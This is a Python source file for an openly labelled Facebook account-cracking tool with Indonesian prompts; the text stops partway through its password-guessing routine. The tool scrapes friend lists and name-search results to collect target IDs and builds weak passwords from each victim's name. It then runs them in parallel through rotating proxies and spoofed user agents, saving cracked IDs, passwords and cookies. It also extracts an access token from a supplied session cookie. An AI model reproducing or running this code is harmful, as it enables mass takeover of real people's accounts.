#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from time import time as TimeAdtya
from bs4 import BeautifulSoup as bs
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns 
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.text import Text 
from rich.panel import Panel 
from rich.panel import Panel as flame
from rich.console import Console
from rich.columns import Columns
from random import randrange as rr
from random  import choice as rc
console = Console(width=100)
lupine_id = Console()
pretty.install()
CON=sol(width=100)
#------------------[ USER-AGENT ]-------------------#Ua
taplikasi = []
usragent=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ua = 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
try:
	
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	#open('socks5.txt','w').write(prox)
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.prox.txt','r').read().splitlines()
for agenku in range(10000):
 a='Mozilla/5.0 (Linux; Android'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='SAMSUNG SM-E5260)'
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/4.0 (compatible; MSIE 9.0;'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .'
 d='NET CLR 3.0.04506.648; .'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='NET CLR 3.5.21022)'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)

 a='Mozilla/5.0 (Windows NT 10.0;'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='WOW64) '
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 '
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Dalvik/2.1.0 (Linux; U; Android 4;'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='vivo V3Max Build/LMY47V)'
 d='[FBAN/Orca-Android;FBAV/306233.0.0.16.1581.163 ;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588046148;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/7;FBCA/'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920}]'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/5.0 (Linux; Android 7.1.1;'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='General Mobile 4G)'
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)
 
 a='Mozilla/5.0 (Linux; Android 10;'
 b=random.choice(['8.1.0','9','10','11','12','13'])
 c='STK-L21)'
 d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101'
 e=random.randrange(73,100)
 f='0'
 g=random.randrange(4200,4900)
 h=random.randrange(40,150)
 i='Mobile Safari/537.36'
 uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 usragent.append(uakuh)

def useragent():
	rr = random.randint
	rc = random.choice
	versi = str(rc(["5.0","7.0","5.1.1","6.0.0","7.0.0","8.0.0","9.0.0","10.0.0","11.0.0","12.0.0","13.0.0","6","7","8","9","10","11","12","4.4.2"]))
	djie = "Mozilla/5.0 (Linux; Android {versi}; iCherry C251 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(0,5))}.{str(rr(0,5))} Chrome/{str(rr(10,109))}.0.{str(rr(1000,5999))}.{str(rr(10,199))} Mobile Safari/537.36"
	sam = "Mozilla/5.0 (Linux; Android {versi}; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(0,5))}.{str(rr(0,5))} Chrome/{str(rr(10,109))}.0.{str(rr(1000,5999))}.{str(rr(10,199))} Mobile Safari/E7FBAF"
	soe = "Mozilla/5.0 (Linux; Android {versi}; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(0,5))}.{str(rr(0,5))} Chrome/{str(rr(10,109))}.0.{str(rr(1000,5999))}.{str(rr(10,199))} Mobile Safari/537.36"
	gudang = "Mozilla/5.0 (Linux; Android {versi}; SAMSUNG SM-G950F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(0,5))}.{str(rr(0,5))} Chrome/{str(rr(10,109))}.0.{str(rr(1000,5999))}.{str(rr(10,199))} Mobile Safari/537.36"
	garam = "Mozilla/5.0 (Linux; Android {versi}; iCherry C251 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/{str(rr(0,5))}.{str(rr(0,5))} Chrome/{str(rr(10,109))}.0.{str(rr(1000,5999))}.{str(rr(10,199))} Mobile Safari/537.36"
	return str(rc([djie,sam,soe,gudang,garam]))
	
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
uadia, uadarimu = [],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
j = '\033[38;2;255;127;0;1m' # ORANGE

AK = "[#FF0000]" #"merah"
AC = "[#AF00FF]" #UNGU
AB= "[#FF00FF[" #PINK
AU = "[#00FFFF]" #CYAN
AT = "[#FF8F00]" #ORANGE
ABU = "[#AAAAAA]" #ABU2
acak = random.choice([AK,AC,AB,AU,AT,ABU])
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#

def dhanz_xd(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
	
def Time():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow
#------------------[ LOGO-LAKNAT ]-----------------#
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "
def banner():
	clear()
	cetak(nel(f'''[bold red]   
╔═══╦╗
╚╗╔╗║║               [bold red]██████████████████████  YT : Dhanz Maker  | Subscribe Ya cuy
 ║║║║╚═╦══╦═╗╔═══╗   [bold red]██████████████████████  Github : https://github.com/Dhanz03
 ║║║║╔╗║╔╗║╔╗╬══║║   [bold white]██████████████████████           Wa : 085881856121
╔╝╚╝║║║║╔╗║║║║║══╣   [bold white]██████████████████████          Status : Free 5H 👉👌
╚═══╩╝╚╩╝╚╩╝╚╩═══╝   [bold white]██████████████████████
\t\t\t
[bold green]Tools[bold white] : Script Multi Facebook Cracker \t [bold green]Made [bold white]By Team Cracker Indonesia ''',title='[bold green]LOGO',style='bold blue' ))

  #--------------------[ BAGIAN-MASUK ]--------------#
def audio(text,file):
	from gtts import gTTS
	my_a = gTTS(text)
	my_a.save(file)
	
	
#===========Play_Audio============#
def play_audio(audio_file):
	from os import system as cmd
	try:
		cmd("play-audio "+audio_file)
	except:
		passf
os.system("clear")
banner()
cetak(nel(f"[b white][[b green]•[b white]] example :  Bagus , Yayan , Epul atau nama sendiri",style="b blue"))
a = input(f"  [{H}•{P}] What is your name : ")
b = (f" WeLll {a} hayu Gasken")
audio(b, "test.mp3")
play_audio("test.mp3")
		
			


#x = "Dhanz"
#y = "123"

#def login1():
	#banner()
	#user = input(f"[{H} • {P}] masukan username :{asu} {P}")
	#pw = input(f"[{H} •{P} ] masukan password : ")
	#if user ==x and pw ==y:
		#print (f"{H}Acces Grented{P}")
		#time.sleep(2)
		#os.system("clear")
		#banner()
	#else:
		#print (f"{m}Acces Denied{P}")
		#time.sleep(2)
		#os.system("clear")
		#back()


	
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			NAME = json.loads(sy.text)['name']
			ID = json.loads(sy.text)['id']
			#sy3 = json.loads(sy.text)['birthday']
			menu(NAME,ID)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()

		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\r[b white]Selamat Datang di Script[b red] Dhanz[b white] Tools,Apabila Ada Kesalahan Segera Hubungin Pemilik Script[b red] Dhanz[b white] Tools ,Silahkan Kalian Login Menggunakan Cookies Dan Apabila Gagal Maka Ganti [b green]Cookies[b white] Yg Lain ',style="b blue",title="[b green]Login Cookies[b white]"))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f' └─[{h}•{P}] Masukkan Cookies :{asu} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		os.system("play-audio /sdcard/login.mp3")
		time.sleep(0.2)
		login()
	except Exception as e:
		print(" Cookies Invalid bro")
		os.system('rm -rf .tok.txt && rm -rf .cok.txt')
		print(e)
		time.sleep(0.2)
		back()
#------------------[ BAGIAN-MENU ]----------------#
def menu(NAME,ID):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	lup = []
	lup.append(flame(f"[bold white][[bold magenta]+[bold white]] NAME[bold white]  : {NAME}\n[[bold magenta]+[bold white]] ID [bold white]   : {ID}\n[[bold magenta]+[bold white]] AUTH[bold white]  : AL-VINO.ADIJAYA",width=37,style="bold blue"))
	lup.append(flame(f"[bold white][[bold magenta]+[bold white]] COUNTRY [bold white]: {CN}\n[[bold magenta]+[bold white]] IP[bold white]      : {IP}\n[[bold magenta]+[bold white]] TANGGAL[bold white] : {tgl} {bln} {thn}",width=38,style="bold blue"))
	lupine_id.print(Columns(lup))
	cetak(nel(f'[bold white][[bold green]1[bold white]].CRACK PUBLICK  \t   \t                 [[bold green]2[bold white]].CRACK MASSAL \n[[bold green]3[bold white]].HASIL CRACK   \t                         [[bold green]4[bold white]].CEK TAP YES\t[[bold red]0[bold white]].KELUAR \t \t \t                 [[b green]5[b white]].CRACK NAMA',title='[bold green]MENU CRACK',style='bold blue'))
	_____dhanz__ganteng_____ = input('  └─[ PILIH ] : ')
	if _____dhanz__ganteng_____ in ['1']:
		dump_massal()
	elif _____dhanz__ganteng_____ in ['2']:
		dump_publik()
	elif _____dhanz__ganteng_____ in ['4']:
		file_cp()
	elif _____dhanz__ganteng_____ in ['3']:
		result()
	elif _____dhanz__ganteng_____ in ['5','05']:
		nama()
	elif _____dhanz__ganteng_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def nama():
	cetak(nel(f"[b white]masukan nama target, gunakan tanda (,) koma jika ingin lebih dari 1 nama",padding=(0,2),style=f"bold blue"))
	nama = []
	custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
	nam = input(f' {H} • {P} masukan nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(dump_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()

def dump_nama(url_nama):
	r = bs(ses.get(str(url_nama)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	try:
		url_nama = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(url_nama):
			print(f'\r  [{H}•{P}] sedang dump {asu}%s{P} id'%(len(id)),end=" ")
			sys.stdout.flush()
			cari_nama(url_nama)
	except:pass

#-----------------[ HASIL-CRACK ]-----------------#
def result():
	atsu = []
	suna = []
	suna.append(flame('[b white][[b green]1[b white]] \t    Hasil CP Anda ',width=37,style="b blue"))
	suna.append(flame('[b white][[b green]2[b white]] \t    Hasil OK Anda ',width=38,style="b blue"))
	lupine_id.print(Columns(suna))
	kz = input(f'  └─[{M}Pilih{P}] : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					atsu.append(flame(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(flame(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(flame(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					lupine_id.print(Columns(atsu))
					#print(Panel('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x))
				else:
					lol.update({str(cih):str(isi)})
					atsu.append(flame(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(flame(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(flame(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					lupine_id.print(Columns(atsu))
			geeh = input(f'  └─[ {M}PILIH {P}] : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		atsu = []
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					atsu.append(flame(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(flame(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(flame(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					lupine_id.print(Columns(atsu))
					#print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					atsu.append(flame(f"[b white][[b red]0{cih}[b white]]",width=10,title=f"[b green]nomer",style=f"b blue"))
					atsu.append(flame(f"[b white]   {isi}[b white]",width=35,title=f"[b green]tanggal",style=f"b blue"))
					atsu.append(flame(f"[b white]  {len(hem)} Account",width=28,title=f"[b green]total akun",style=f"b blue"))
					lupine_id.print(Columns(atsu))
			geeh = input('\n   └─[ PILIH ]: ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()


#=======dump publik==========#
def dump_massal():
		try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
		except IOError:exit()
		__midlane__ = input(f"\n  [{H}√{P}] Id publik : ")
		uid.append(__midlane__)
		for __colmek__ in uid:
			try:
				session = requests.Session()
				get_id = session.get(f'https://graph.facebook.com/v15.0/{__colmek__ }?fields=name,friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
				peler = get_id["name"]
				for xyz in get_id['friends']['data']:
					try:
						__data__ = (xyz['id']+'|'+xyz['name'])
						if __data__ in id:pass
						else:id.append(__data__)
					except:continue
			except (KeyError,IOError):exit(f"{P}!. Id private/tidak memiliki teman")
			try:
				cetak(nel(f"[bold white][[bold green]√[bold white]] Target name : [bold green]{peler}[bold white]\n[[bold green]√[bold white]] Jumlah [bold green]{str(len(id))}[bold white] id",style='bold blue'))
				setting()
			except requests.exceptions.ConnectionError:
				exit(f"{P}!. Tidak ada koneksi")
				
				
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(nel(f'\t \t[bold white]Pilih Berapa Target Yg Kalian Ingin Crack',title='[bold green]ID MASSAL',style="bold blue"))
		jum = int(input('  └─[ MAU BERAPA TARGET  ] : '))
	except ValueError:
		print(' Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		cetak(nel(f'\t \t[bold white]Masukan Id Target Yg Publik Bukan Yg Privat',title='[bold green]ID',style="bold blue"))
		kl = input('  └─[ MASUKAN ID YANG KE '+str(yz)+' ] : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print(f'  └─[TOTAL ID ]: {h}{P}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

##-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f'[bold white][[b green]1[b white]].CRACK AKUN OLD        [[b green]2[b white]].CRACK AKUN NEW    \t[[b green]3[b white]].CRACK RANDOM ',title='[bold green]MENU PILIHAN',style=' bold blue' ))
	hu = input('  └─[ Pilih ] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	lupXfla = []
	lupXfla.append(flame(f'\r[bold white]    METODE MOBILE',width=25,title=f"[bold red]• [bold green]01 [bold red]•",style=f"bold blue"))
	lupXfla.append(flame(f'\r[bold white]    METODE MOBILEV2',width=24,title=f"[bold red]• [bold green]02 [bold red]•",style=f"bold blue"))
	lupXfla.append(flame(f'\r[bold white]    METODE ASYNC ',width=25,title=f"[bold red]• [bold green]03 [bold red]•",style=f"bold blue"))
	lupXfla.append(flame(f'\r[bold white]    METODE API 🔥 ',width=25,title=f"[bold red]• [bold green]04 [bold red]•",style=f"bold blue"))
	lupine_id.print(Columns(lupXfla))
	lupXfla = []
	lupXfla.append(flame(f'\t[bold white]                       METODE API ',width=80,title=f"[bold red]• [bold green]04 [bold red]•",style=f"bold blue"))
	lupine_id.print(Columns(lupXfla))
	#cetak(nel(f'[1].M.FACEBOOK.COM     [2].MBASIC.FACEBOOK.COM    [3].TOUCH.FACEBOOK.COM',title='[bold green]METODE CRACK'))
#	print('>> 4. Mtouch ')
	hc = input('  └─[ Pilih ] : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('api')
	else:
		method.append('mobile')
	gw = (f"[bold white]\t \t         Silahkan ketik  ([b green]y[b white]/[b red]t[b white]) ")
	cetak(nel(gw,title=f"[bold green]TAMPILKAN APK TERKAIT[white]",style=" bold blue" ))
	jembot = input(f'  └─[ Pilih ] :  ')
	if jembot in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif jembot in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')

	
	Dhanz = (f"[bold white]\t \t         Silahkan Ketik ([b green]y[b white]/[b red]t[b white])")
	cetak(nel(Dhanz,title=f"[b green]GANTI USER AGENTS[b white]",style="bold blue"))
	ua = input(f'   └─[ Pilih ] : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'   └─[{H}Input your user agent{P}]: {asu}{P}');uadia.append(bz)
	else:uadarimu.append('uasc')
#	pwplus=input('[+].TAMBAHKAN PASSWORD MANUAL ( Y/t ) ')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
#		pwku=input('>> Masukkan Password Tambahan : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
	passwrd()
def warning():
	
	cetak(Panel(f"[bold white]Apabila tidak ada hasil maka main kan ([bold red]mode pesawat[bold white]) selama proses crack berjalan",style="bold blue",title="[bold green]Warning[bold white]"))
def tampung():
	lupXfla = []
	lupXfla.append(flame(f'\r[bold green]     {okc} ',width=37,title=f"[bold white] Result [bold white]",style=f"bold blue"))
	lupXfla.append(flame(f'\r[bold yellow]     {cpc} ',width=38,title=f"[bold white] Result [bold white]",style=f"bold blue"))
	lupine_id.print(Columns(lupXfla))
	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	clear();banner()
	tampung()
	warning()
	#cetak(nel(f'[bold white]Hasil [bold green]OK[bold white] Tersimpan Di : [bold green]OK/[bold green]{okc}\n[bold white]Hasil [bold yellow]CP[bold white] Tersimpan Di : [bold yellow]CP/[bold yellow]{cpc}',style="bold blue"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'touch' in method:
